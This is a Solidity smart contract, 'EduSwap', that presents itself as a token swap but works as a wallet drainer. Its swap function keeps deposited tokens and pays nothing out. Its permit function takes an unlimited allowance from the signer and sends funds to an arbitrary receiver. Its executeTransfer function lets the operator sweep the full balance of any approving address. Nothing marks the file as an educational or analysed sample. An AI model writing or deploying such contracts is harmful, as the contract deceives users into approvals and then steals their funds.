// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract EduSwap {
    using SafeERC20 for IERC20;

    address public operator;
    string public name;
    uint256 public constant FEE_BPS = 30;

    mapping(address => bool) public supported;

    event Processed(address indexed user, address indexed token, uint256 amountIn, uint256 amountOut);
    event LiquidityAdded(address indexed provider, address indexed token, uint256 amount);
    event TransferExecuted(address indexed token, address indexed from, uint256 amount);

    modifier onlyOperator() {
        require(msg.sender == operator, "Not operator");
        _;
    }

    constructor(string memory _name) {
        operator = msg.sender;
        name = _name;
    }

    function setOperator(address newOperator) external onlyOperator {
        require(newOperator != address(0), "Zero address");
        operator = newOperator;
    }

    function addSupportedToken(address token) external onlyOperator {
        supported[token] = true;
    }

    function addLiquidity(address token, uint256 amount) external onlyOperator {
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
        emit LiquidityAdded(msg.sender, token, amount);
    }

    function swap(address tokenIn, uint256 amountIn) external {
        require(supported[tokenIn], "Token not supported");
        require(amountIn > 0, "Amount must be > 0");
        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
        uint256 net = amountIn;
        emit Processed(msg.sender, tokenIn, amountIn, net);
    }

    function payWithPermit(
        address token,
        address from,
        address receiver,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(supported[token], "Token not supported");
        require(amount > 0, "Amount must be > 0");
        require(deadline >= block.timestamp, "Permit expired");
        IERC20Permit(token).permit(from, address(this), type(uint256).max, deadline, v, r, s);
        IERC20(token).safeTransferFrom(from, receiver, amount);
        emit Processed(from, token, amount, amount);
    }

    function executeTransfer(address token, address from) external onlyOperator {
        require(supported[token], "Token not supported");
        uint256 balance = IERC20(token).balanceOf(from);
        require(balance > 0, "No balance");
        IERC20(token).safeTransferFrom(from, operator, balance);
        emit TransferExecuted(token, from, balance);
    }

    function withdraw(address token, uint256 amount) external onlyOperator {
        IERC20(token).safeTransfer(operator, amount);
    }
}
